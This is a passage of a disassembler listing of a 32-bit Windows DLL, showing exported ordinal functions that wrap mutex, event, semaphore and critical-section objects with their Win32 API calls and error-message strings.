loc_6AF4CC5C:				; CODE XREF: Ordinal1310+1Cj
		pop	esi
		leave
		retn	8
Ordinal1310	endp

; Exported entry 1311.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1311
Ordinal1311	proc near		; DATA XREF: .rdata:6AF5F720o
					; .rdata:off_6AF66098o
		mov	eax, [ecx+4]
		test	eax, eax
		jnz	short loc_6AF4CC76
		push	offset aCmutexLockM_hm ; "CMutex::Lock() : m_hMutex == NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CC76:				; CODE XREF: Ordinal1311+5j
		push	eax		; hMutex
		call	ds:ReleaseMutex
		retn
Ordinal1311	endp

; Exported entry 1313.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1313
Ordinal1313	proc near		; CODE XREF: Ordinal1072+29p
					; Ordinal1133+49p ...
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		mov	dword ptr [eax], offset	off_6AF5F74C
		retn
Ordinal1313	endp

; Exported entry 1321.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1321
Ordinal1321	proc near		; CODE XREF: Ordinal1224j
					; Ordinal1222+Bp
					; DATA XREF: ...
		mov	eax, [ecx]
		push	0
		push	0
		call	dword ptr [eax+4]
		retn
Ordinal1321	endp

; Exported entry 1322.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1322
Ordinal1322	proc near		; CODE XREF: Ordinal1079+6j
					; Ordinal1252+1Ap ...
		mov	eax, [ecx+4]
		test	eax, eax
		jnz	short loc_6AF4CCAA
		push	offset aCeventSetevent ; "CEvent::SetEvent() : m_hEvent	== NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CCAA:				; CODE XREF: Ordinal1322+5j
		push	eax		; hEvent
		call	ds:SetEvent
		retn
Ordinal1322	endp

; Exported entry 1323.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1323
Ordinal1323	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+4]
		test	eax, eax
		jnz	short loc_6AF4CCC7
		push	offset aCeventPulseeve ; "CEvent::PulseEvent() : m_hEvent == NULL"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CCC7:				; CODE XREF: Ordinal1323+5j
		push	eax		; hEvent
		call	ds:PulseEvent
		retn
Ordinal1323	endp

; Exported entry 1324.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1324
Ordinal1324	proc near		; CODE XREF: Ordinal1251+35p
					; Ordinal1320:loc_6AF4D17Ep ...
		mov	eax, [ecx+4]
		test	eax, eax
		jnz	short loc_6AF4CCE4
		push	offset aCeventReseteve ; "CEvent::ResetEvent() : m_hEvent == NULL"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CCE4:				; CODE XREF: Ordinal1324+5j
		push	eax		; hEvent
		call	ds:ResetEvent
		retn
Ordinal1324	endp

; Exported entry 1326.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1326(DWORD dwMilliseconds, int)
		public Ordinal1326
Ordinal1326	proc near		; DATA XREF: .rdata:6AF5F470o
					; .rdata:6AF5F750o ...

var_C		= byte ptr -0Ch
dwMilliseconds	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+4], 0
		jnz	short loc_6AF4CD0A
		push	offset aCeventLockM_he ; "CEvent::Lock() : m_hEvent == NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4CD36
; ---------------------------------------------------------------------------

loc_6AF4CD0A:				; CODE XREF: Ordinal1326+Dj
		push	0
		push	[ebp+arg_4]
		lea	ecx, [ebp+var_C]
		call	Ordinal1267
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		lea	ecx, [ebp+var_C]
		push	dword ptr [esi+4] ; pHandles
		call	Ordinal1271
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_C]
		inc	esi
		call	Ordinal1268
		mov	eax, esi

loc_6AF4CD36:				; CODE XREF: Ordinal1326+1Cj
		pop	esi
		leave
		retn	8
Ordinal1326	endp

; Exported entry 1058.
; Exported entry 1327.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1058
Ordinal1058	proc near		; DATA XREF: .rdata:6AF5DDB4o
					; .rdata:6AF5F474o ...
		xor	eax, eax	; ccL30_1058
		inc	eax
		retn
Ordinal1058	endp

; Exported entry 231.
; Exported entry 625.
; Exported entry 650.
; Exported entry 702.
; Exported entry 757.
; Exported entry 772.
; Exported entry 839.
; Exported entry 880.
; Exported entry 893.
; Exported entry 992.
; Exported entry 1117.
; Exported entry 1118.
; Exported entry 1167.
; Exported entry 1293.
; Exported entry 1301.
; Exported entry 1305.
; Exported entry 1312.
; Exported entry 1316.
; Exported entry 1328.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1118
Ordinal1118	proc near		; CODE XREF: Ordinal147+2D8p
					; Ordinal144+2B5p ...
		mov	eax, [ecx+4]	; ccL30_231
					; ccL30_625
					; ccL30_650
					; ccL30_702
					; ccL30_757
					; ccL30_772
					; ccL30_839
					; ccL30_880
					; ccL30_893
					; ccL30_992
					; ccL30_1117
					; ccL30_1118
					; ccL30_1167
					; ccL30_1293
					; ccL30_1301
					; ccL30_1305
					; ccL30_1312
					; ccL30_1316
		retn
Ordinal1118	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_10. PRESS	KEYPAD "+" TO EXPAND]
; Exported entry 1279.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1279
Ordinal1279	proc near		; CODE XREF: Ordinal257+Cp
					; Ordinal383+11p ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F800
		call	Ordinal1283
		mov	dword ptr [esi], offset	off_6AF5F570
		pop	esi
		retn
Ordinal1279	endp

; Exported entry 1282.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1282
Ordinal1282	proc near		; CODE XREF: Ordinal1278+1Fp
					; DATA XREF: .rdata:off_6AF66098o

var_20		= dword	ptr -20h
Args		= byte ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	10h
		push	offset stru_6AF5F848
		call	__SEH_prolog
		mov	esi, ecx
		mov	[ebp+var_20], esi
		call	Ordinal1283
		and	[ebp+ms_exc.disabled], 0
		lea	eax, [esi+4]
		push	eax		; lpCriticalSection
		call	ds:InitializeCriticalSection
		mov	dword ptr [esi+1Ch], 1
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_6AF4CDCE
; ---------------------------------------------------------------------------

loc_6AF4CDA7:				; DATA XREF: .rdata:stru_6AF5F848o
		mov	eax, [ebp+ms_exc.exc_ptr] ; Exception filter 0 for function 6AF4CD76
		mov	eax, [eax]
		mov	eax, [eax]
		mov	dword ptr [ebp+Args], eax
		xor	eax, eax
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CDB5:				; DATA XREF: .rdata:stru_6AF5F848o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF4CD76
		push	dword ptr [ebp+Args] ; Args
		push	offset aCcriticalsec_3 ; "CCriticalSection::Create() : __except()"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	esi, [ebp+var_20]

loc_6AF4CDCE:				; CODE XREF: Ordinal1282+2Fj
		mov	eax, [esi+1Ch]
		call	__SEH_epilog
		retn
Ordinal1282	endp

; Exported entry 1292.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1292
Ordinal1292	proc near		; CODE XREF: Ordinal1244+14p
					; sub_6AF4D1CA+3p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F6AC
		call	Ordinal1296
		mov	dword ptr [esi], offset	off_6AF5F570
		pop	esi
		retn
Ordinal1292	endp

; Exported entry 1294.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1294(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCSTR	lpString2, int)
		public Ordinal1294
Ordinal1294	proc near		; CODE XREF: Ordinal1291+1Fp
					; DATA XREF: .rdata:off_6AF66098o

String1		= byte ptr -108h
var_4		= dword	ptr -4
lpSemaphoreAttributes= dword ptr  8
lInitialCount	= dword	ptr  0Ch
lMaximumCount	= dword	ptr  10h
lpString2	= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		mov	[ebp+var_4], eax
		mov	esi, ecx
		call	Ordinal1296
		cmp	[ebp+arg_10], 0
		mov	eax, [ebp+lpString2]
		jz	short loc_6AF4CE3A
		push	104h		; int
		lea	ecx, [ebp+String1]
		push	ecx		; lpString1
		push	eax		; lpString2
		call	Ordinal1277
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4CE34
		push	offset aCsemaphore ; "CSemaphore"
		push	offset aSCreateCreateg ; "%s::Create() : CreateGlobalName() == FA"...
		jmp	short loc_6AF4CE5D
; ---------------------------------------------------------------------------

loc_6AF4CE34:				; CODE XREF: Ordinal1294+39j
		lea	eax, [ebp+String1]

loc_6AF4CE3A:				; CODE XREF: Ordinal1294+20j
		push	eax		; lpName
		push	[ebp+lMaximumCount] ; lMaximumCount
		push	[ebp+lInitialCount] ; lInitialCount
		push	[ebp+lpSemaphoreAttributes] ; lpSemaphoreAttributes
		call	ds:CreateSemaphoreA
		test	eax, eax
		mov	[esi+4], eax
		jnz	short loc_6AF4CE68
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCsemaphoreCrea ; "CSemaphore::Create() : CreateSemaphore("...

loc_6AF4CE5D:				; CODE XREF: Ordinal1294+45j
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4CE6B
; ---------------------------------------------------------------------------

loc_6AF4CE68:				; CODE XREF: Ordinal1294+62j
		xor	eax, eax
		inc	eax

loc_6AF4CE6B:				; CODE XREF: Ordinal1294+79j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	14h
Ordinal1294	endp

; Exported entry 1295.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1295(DWORD dwDesiredAccess, BOOL	bInheritHandle,	LPCSTR Args, int)
		public Ordinal1295
Ordinal1295	proc near		; DATA XREF: .rdata:off_6AF66098o

String1		= byte ptr -108h
var_4		= dword	ptr -4
dwDesiredAccess	= dword	ptr  8
bInheritHandle	= dword	ptr  0Ch
Args		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		push	edi
		mov	[ebp+var_4], eax
		mov	esi, ecx
		call	Ordinal1296
		cmp	[ebp+arg_C], 0
		mov	edi, [ebp+Args]
		jz	short loc_6AF4CECD
		push	104h		; int
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		push	edi		; lpString2
		call	Ordinal1277
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4CEC7
		push	offset aCsemaphore ; "CSemaphore"
		push	offset aSCreateCreateg ; "%s::Create() : CreateGlobalName() == FA"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4CEF6
; ---------------------------------------------------------------------------

loc_6AF4CEC7:				; CODE XREF: Ordinal1295+3Aj
		lea	edi, [ebp+String1]

loc_6AF4CECD:				; CODE XREF: Ordinal1295+21j
		push	edi		; lpName
		push	[ebp+bInheritHandle] ; bInheritHandle
		push	[ebp+dwDesiredAccess] ;	dwDesiredAccess
		call	ds:OpenSemaphoreA
		test	eax, eax
		mov	[esi+4], eax
		jnz	short loc_6AF4CEFA
		call	ds:GetLastError
		push	eax
		push	edi		; Args
		push	offset aCsemaphoreOpen ; "CSemaphore::Open() : OpenSemaphore() =="...
		call	sub_6AF3102E
		add	esp, 0Ch

loc_6AF4CEF6:				; CODE XREF: Ordinal1295+4Dj
		xor	eax, eax
		jmp	short loc_6AF4CEFD
; ---------------------------------------------------------------------------

loc_6AF4CEFA:				; CODE XREF: Ordinal1295+67j
		xor	eax, eax
		inc	eax

loc_6AF4CEFD:				; CODE XREF: Ordinal1295+80j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	10h
Ordinal1295	endp

; Exported entry 1304.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1304
Ordinal1304	proc near		; CODE XREF: Ordinal1073+30p
					; Ordinal1244+Cp ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F718
		call	Ordinal1296
		mov	dword ptr [esi], offset	off_6AF5F570
		pop	esi
		retn
Ordinal1304	endp

; Exported entry 1306.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1306(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR	lpString2, int)
		public Ordinal1306
Ordinal1306	proc near		; CODE XREF: Ordinal1074+4C5p
					; Ordinal1303+1Dp
					; DATA XREF: ...

String1		= byte ptr -108h
var_4		= dword	ptr -4
lpMutexAttributes= dword ptr  8
bInitialOwner	= dword	ptr  0Ch
lpString2	= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		mov	[ebp+var_4], eax
		mov	esi, ecx
		call	Ordinal1296
		cmp	[ebp+arg_C], 0
		mov	eax, [ebp+lpString2]
		jz	short loc_6AF4CF6E
		push	104h		; int
		lea	ecx, [ebp+String1]
		push	ecx		; lpString1
		push	eax		; lpString2
		call	Ordinal1277
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4CF68
		push	offset aCmutex	; "CMutex"
		push	offset aSCreateCreateg ; "%s::Create() : CreateGlobalName() == FA"...
		jmp	short loc_6AF4CF8E
; ---------------------------------------------------------------------------

loc_6AF4CF68:				; CODE XREF: Ordinal1306+39j
		lea	eax, [ebp+String1]

loc_6AF4CF6E:				; CODE XREF: Ordinal1306+20j
		push	eax		; lpName
		push	[ebp+bInitialOwner] ; bInitialOwner
		push	[ebp+lpMutexAttributes]	; lpMutexAttributes
		call	ds:CreateMutexA
		test	eax, eax
		mov	[esi+4], eax
		jnz	short loc_6AF4CF99
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCmutexCreateCr ; "CMutex::Create() : CreateMutex() == NUL"...

loc_6AF4CF8E:				; CODE XREF: Ordinal1306+45j
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4CF9C
; ---------------------------------------------------------------------------

loc_6AF4CF99:				; CODE XREF: Ordinal1306+5Fj
		xor	eax, eax
		inc	eax

loc_6AF4CF9C:				; CODE XREF: Ordinal1306+76j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	10h
Ordinal1306	endp

; Exported entry 1307.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1307(DWORD dwDesiredAccess, BOOL	bInheritHandle,	LPCSTR Args, int)
		public Ordinal1307
Ordinal1307	proc near		; DATA XREF: .rdata:off_6AF66098o

String1		= byte ptr -108h
var_4		= dword	ptr -4
dwDesiredAccess	= dword	ptr  8
bInheritHandle	= dword	ptr  0Ch
Args		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		push	edi
		mov	[ebp+var_4], eax
		mov	esi, ecx
		call	Ordinal1296
		cmp	[ebp+arg_C], 0
		mov	edi, [ebp+Args]
		jz	short loc_6AF4CFFE
		push	104h		; int
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		push	edi		; lpString2
		call	Ordinal1277
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4CFF8
		push	offset aCmutex	; "CMutex"
		push	offset aSCreateCreateg ; "%s::Create() : CreateGlobalName() == FA"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4D027
; ---------------------------------------------------------------------------

loc_6AF4CFF8:				; CODE XREF: Ordinal1307+3Aj
		lea	edi, [ebp+String1]

loc_6AF4CFFE:				; CODE XREF: Ordinal1307+21j
		push	edi		; lpName
		push	[ebp+bInheritHandle] ; bInheritHandle
		push	[ebp+dwDesiredAccess] ;	dwDesiredAccess
		call	ds:OpenMutexA
		test	eax, eax
		mov	[esi+4], eax
		jnz	short loc_6AF4D02B
		call	ds:GetLastError
		push	eax
		push	edi		; Args
		push	offset aCmutexOpenOpen ; "CMutex::Open() : OpenMutex() == NULL,	%"...
		call	sub_6AF3102E
		add	esp, 0Ch

loc_6AF4D027:				; CODE XREF: Ordinal1307+4Dj
		xor	eax, eax
		jmp	short loc_6AF4D02E
; ---------------------------------------------------------------------------

loc_6AF4D02B:				; CODE XREF: Ordinal1307+67j
		xor	eax, eax
		inc	eax

loc_6AF4D02E:				; CODE XREF: Ordinal1307+80j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	10h
Ordinal1307	endp

; Exported entry 1315.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1315
Ordinal1315	proc near		; CODE XREF: Ordinal1073+3Bp
					; Ordinal1133+DEp ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F74C
		call	Ordinal1296
		mov	dword ptr [esi], offset	off_6AF5F570
		pop	esi
		retn
Ordinal1315	endp

; Exported entry 1317.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1317(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset,	BOOL bInitialState, LPCSTR lpString2, int)
		public Ordinal1317
Ordinal1317	proc near		; CODE XREF: Ordinal1074+2E5p
					; Ordinal1133+57p ...

String1		= byte ptr -108h
var_4		= dword	ptr -4
lpEventAttributes= dword ptr  8
bManualReset	= dword	ptr  0Ch
bInitialState	= dword	ptr  10h
lpString2	= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		mov	[ebp+var_4], eax
		mov	esi, ecx
		call	Ordinal1296
		cmp	[ebp+arg_10], 0
		mov	eax, [ebp+lpString2]
		jz	short loc_6AF4D09F
		push	104h		; int
		lea	ecx, [ebp+String1]
		push	ecx		; lpString1
		push	eax		; lpString2
		call	Ordinal1277
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4D099
		push	offset aCevent	; "CEvent"
		push	offset aSCreateCreateg ; "%s::Create() : CreateGlobalName() == FA"...
		jmp	short loc_6AF4D0C2
; ---------------------------------------------------------------------------

loc_6AF4D099:				; CODE XREF: Ordinal1317+39j
		lea	eax, [ebp+String1]

loc_6AF4D09F:				; CODE XREF: Ordinal1317+20j
		push	eax		; lpName
		push	[ebp+bInitialState] ; bInitialState
		push	[ebp+bManualReset] ; bManualReset
		push	[ebp+lpEventAttributes]	; lpEventAttributes
		call	ds:CreateEventA
		test	eax, eax
		mov	[esi+4], eax
		jnz	short loc_6AF4D0CD
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCeventCreateCr ; "CEvent::Create() : CreateEvent() == NUL"...

loc_6AF4D0C2:				; CODE XREF: Ordinal1317+45j
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4D0D0
; ---------------------------------------------------------------------------

loc_6AF4D0CD:				; CODE XREF: Ordinal1317+62j
		xor	eax, eax
		inc	eax

loc_6AF4D0D0:				; CODE XREF: Ordinal1317+79j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	14h
Ordinal1317	endp

; Exported entry 1318.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1318(DWORD dwDesiredAccess, BOOL	bInheritHandle,	LPCSTR Args, int)
		public Ordinal1318
Ordinal1318	proc near		; DATA XREF: .rdata:off_6AF66098o

String1		= byte ptr -108h
var_4		= dword	ptr -4
dwDesiredAccess	= dword	ptr  8
bInheritHandle	= dword	ptr  0Ch
Args		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		push	edi
		mov	[ebp+var_4], eax
		mov	esi, ecx
		call	Ordinal1296
		cmp	[ebp+arg_C], 0
		mov	edi, [ebp+Args]
		jz	short loc_6AF4D132
		push	104h		; int
		lea	eax, [ebp+String1]
		push	eax		; lpString1
		push	edi		; lpString2
		call	Ordinal1277
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF4D12C
		push	offset aCevent	; "CEvent"
		push	offset aSCreateCreateg ; "%s::Create() : CreateGlobalName() == FA"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4D15B
; ---------------------------------------------------------------------------

loc_6AF4D12C:				; CODE XREF: Ordinal1318+3Aj
		lea	edi, [ebp+String1]

loc_6AF4D132:				; CODE XREF: Ordinal1318+21j
		push	edi		; lpName
		push	[ebp+bInheritHandle] ; bInheritHandle
		push	[ebp+dwDesiredAccess] ;	dwDesiredAccess
		call	ds:OpenEventA
		test	eax, eax
		mov	[esi+4], eax
		jnz	short loc_6AF4D15F
		call	ds:GetLastError
		push	eax
		push	edi		; Args
		push	offset aCeventOpenOpen ; "CEvent::Open() : OpenEvent() == NULL,	%"...
		call	sub_6AF3102E
		add	esp, 0Ch

loc_6AF4D15B:				; CODE XREF: Ordinal1318+4Dj
		xor	eax, eax
		jmp	short loc_6AF4D162
; ---------------------------------------------------------------------------

loc_6AF4D15F:				; CODE XREF: Ordinal1318+67j
		xor	eax, eax
		inc	eax

loc_6AF4D162:				; CODE XREF: Ordinal1318+80j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn	10h
Ordinal1318	endp

; Exported entry 1320.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1320
Ordinal1320	proc near		; CODE XREF: Ordinal1226j
					; Ordinal1223+7p ...

arg_0		= dword	ptr  4

		cmp	[esp+arg_0], 0
		jz	short loc_6AF4D17E
		call	Ordinal1322
		jmp	short locret_6AF4D183
; ---------------------------------------------------------------------------

loc_6AF4D17E:				; CODE XREF: Ordinal1320+5j
		call	Ordinal1324

locret_6AF4D183:			; CODE XREF: Ordinal1320+Cj
		retn	4
Ordinal1320	endp

; Exported entry 1278.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1278
Ordinal1278	proc near		; CODE XREF: Ordinal256+1Cp
					; Ordinal258+18p ...
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+1Ch], 0
		push	18h		; Size
		lea	eax, [esi+4]
		push	0		; Val
		push	eax		; Dst
		mov	dword ptr [esi], offset	off_6AF5F800
		call	memset
		add	esp, 0Ch
		mov	ecx, esi
		call	Ordinal1282
		mov	eax, esi
		pop	esi
		retn
Ordinal1278	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4D1AE(void *, char)
sub_6AF4D1AE	proc near		; DATA XREF: .rdata:off_6AF5F800o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1279
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4D1C4
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4D1C4:				; CODE XREF: sub_6AF4D1AE+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4D1AE	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4D1CA(void *, char)
sub_6AF4D1CA	proc near		; DATA XREF: .rdata:off_6AF5F6ACo

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1292
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4D1E0
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4D1E0:				; CODE XREF: sub_6AF4D1CA+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4D1CA	endp

; Exported entry 1291.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1291(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCSTR	lpString2, int)
		public Ordinal1291
Ordinal1291	proc near		; CODE XREF: Ordinal1243+16p
					; DATA XREF: .rdata:off_6AF66098o

lpSemaphoreAttributes= dword ptr  8
lInitialCount	= dword	ptr  0Ch
lMaximumCount	= dword	ptr  10h
lpString2	= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_10]	; int
		mov	esi, ecx
		push	[ebp+lpString2]	; lpString2
		and	dword ptr [esi+4], 0
		push	[ebp+lMaximumCount] ; lMaximumCount
		mov	dword ptr [esi], offset	off_6AF5F6AC
		push	[ebp+lInitialCount] ; lInitialCount
		push	[ebp+lpSemaphoreAttributes] ; lpSemaphoreAttributes
		call	Ordinal1294
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	14h
Ordinal1291	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4D211(void *, char)
sub_6AF4D211	proc near		; DATA XREF: .rdata:off_6AF5F718o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1304
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4D227
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4D227:				; CODE XREF: sub_6AF4D211+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4D211	endp

; Exported entry 1303.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1303(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR	lpString2, int)
		public Ordinal1303
Ordinal1303	proc near		; CODE XREF: Ordinal1243+22p
					; DATA XREF: .rdata:off_6AF66098o

lpMutexAttributes= dword ptr  4
bInitialOwner	= dword	ptr  8
lpString2	= dword	ptr  0Ch
arg_C		= dword	ptr  10h

		push	esi
		push	[esp+4+arg_C]	; int
		mov	esi, ecx
		push	[esp+8+lpString2] ; lpString2
		and	dword ptr [esi+4], 0
		push	[esp+0Ch+bInitialOwner]	; bInitialOwner
		mov	dword ptr [esi], offset	off_6AF5F718
		push	[esp+10h+lpMutexAttributes] ; lpMutexAttributes
		call	Ordinal1306
		mov	eax, esi
		pop	esi
		retn	10h
Ordinal1303	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4D255(void *, char)
sub_6AF4D255	proc near		; DATA XREF: .rdata:off_6AF5F74Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1315
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4D26B
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4D26B:				; CODE XREF: sub_6AF4D255+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4D255	endp

; Exported entry 1314.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1314(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset,	BOOL bInitialState, LPCSTR lpString2, int)
		public Ordinal1314
Ordinal1314	proc near		; CODE XREF: Ordinal1218+Bp
					; Ordinal1220+Bp ...

lpEventAttributes= dword ptr  8
bManualReset	= dword	ptr  0Ch
bInitialState	= dword	ptr  10h
lpString2	= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_10]	; int
		mov	esi, ecx
		push	[ebp+lpString2]	; lpString2
		and	dword ptr [esi+4], 0
		push	[ebp+bInitialState] ; bInitialState
		mov	dword ptr [esi], offset	off_6AF5F74C
		push	[ebp+bManualReset] ; bManualReset
		push	[ebp+lpEventAttributes]	; lpEventAttributes
		call	Ordinal1317
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	14h
Ordinal1314	endp

; Exported entry 1329.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1329
Ordinal1329	proc near		; CODE XREF: Ordinal1353+272p
					; Ordinal1356+160p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		push	104h		; Size
		lea	eax, [esi+8]
		push	0		; Val
		push	eax		; Dst
		mov	dword ptr [esi], offset	off_6AF5F9E4
		call	memset
		add	esp, 0Ch
		mov	eax, esi
		pop	esi
		retn
Ordinal1329	endp

; Exported entry 1330.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1330
Ordinal1330	proc near		; CODE XREF: sub_6AF53596+6j
					; sub_6AF535CB+6j ...
		mov	dword ptr [ecx], offset	off_6AF5F9E4
		retn
